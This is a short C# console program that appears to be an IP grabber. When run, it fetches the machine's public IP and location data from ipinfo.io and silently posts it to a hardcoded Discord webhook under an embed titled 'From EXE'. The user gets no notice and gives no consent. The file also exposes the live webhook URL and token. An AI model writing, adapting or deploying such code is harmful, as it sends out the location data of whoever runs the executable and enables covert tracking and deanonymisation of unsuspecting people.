using System;
using System.Net.Http;
using System.Net.Http.Json;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        var webhook = "https://discord.com/api/webhooks/1402618562555809792/f-Usoh0GY960bJwKGo1_wVrZ7Wu44EVOhl_coNci6vB-G3iHMKEOC7EAZfTEhKbELBb0";

        using (HttpClient client = new HttpClient())
        {
            var response = await client.GetAsync("https://ipinfo.io/json");
            var ipInfo = await response.Content.ReadAsStringAsync();

            var embed = new
            {
                title = "From EXE",
                description = ipInfo,
                color = 2326507
            };

            var payload = new
            {
                content = "",
                tts = false,
                embeds = new[] { embed },
                components = new object[] { },
                actions = new object(),
                flags = 0
            };

            var content = JsonContent.Create(payload);
            await client.PostAsync(webhook, content);
        }
    }
}
